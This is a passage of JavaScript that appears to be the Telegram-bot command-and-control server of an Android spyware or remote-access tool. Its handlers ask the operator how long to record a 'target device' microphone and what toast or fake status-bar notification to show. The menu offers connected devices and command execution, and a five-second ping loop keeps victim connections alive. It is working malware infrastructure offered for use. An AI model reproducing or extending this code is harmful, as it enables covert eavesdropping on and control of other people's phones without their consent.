                        '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
                {reply_markup: {force_reply: true}}
            )
            currentUuid = uuid
            break;
        case 'microphone':
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n' +
                '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ',
                {reply_markup: {force_reply: true}, parse_mode: "HTML"}
            )
            currentUuid = uuid
            break;
        case 'toast':
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚\n\n' +
                '• ᴛᴏᴀꜱᴛ ɪꜱ ᴀ ꜱʜᴏʀᴛ ᴍᴇꜱꜱᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀꜱ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ ꜱᴄʀᴇᴇɴ ꜰᴏʀ ᴀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅꜱ',
                {reply_markup: {force_reply: true}, parse_mode: "HTML"}
            )
            currentUuid = uuid
            break;
        case 'show_notification':
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
                '• ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜꜱ ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ',
                {reply_markup: {force_reply: true}, parse_mode: "HTML"}
            )
            currentUuid = uuid
            break;
        default:
            appBot.sendMessage(id,
                '°• 𝙎𝙤𝙧𝙧𝙮, 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙣𝙤𝙩 𝙧𝙚𝙘𝙤𝙜𝙣𝙞𝙯𝙚𝙙',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]]
                    }
                }
            );
        break;
    }
})

const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 10 });

setInterval(function () {
  appSocket.clients.forEach(function each(ws) {
    ws.send('ping', { compress: true }); // Enviar mensajes comprimidos
  });

  try {
    axios.get(address, { httpAgent }).then(r => "");
  } catch (e) {
    console.error('Error en la petición GET:', e);
  }
}, 5000);


appServer.listen(process.env.PORT || 8999);
